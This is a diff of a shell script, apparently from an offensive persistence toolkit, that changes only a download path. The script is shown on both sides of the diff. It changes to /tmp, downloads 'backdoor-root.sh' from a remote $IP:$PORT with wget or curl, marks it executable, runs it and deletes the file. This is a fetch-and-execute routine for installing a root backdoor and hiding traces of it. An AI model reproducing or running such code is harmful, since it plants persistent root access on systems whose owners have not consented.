@@ -10,7 +10,7 @@ cd /tmp
 
 if [[ "$HAS_WGET" != "$FALSE" ]];
 then
-	wget "http://$IP:$PORT/persistence/service/backdoor-root/backdoor-root.sh"
+	wget "http://$IP:$PORT/persistence/service/backdoor/backdoor-root.sh"
 	chmod +x backdoor-root.sh
 	./backdoor-root.sh
 	rm backdoor-root.sh
@@ -19,7 +19,7 @@ fi
 
 if [[ "$HAS_CURL" != "$FALSE" ]];
 then
-	curl "http://$IP:$PORT/persistence/service/backdoor-root/backdoor-root.sh" -o backdoor-root.sh
+	curl "http://$IP:$PORT/persistence/service/backdoor/backdoor-root.sh" -o backdoor-root.sh
 	chmod +x backdoor-root.sh
 	./backdoor-root.sh
 	rm backdoor-root.sh
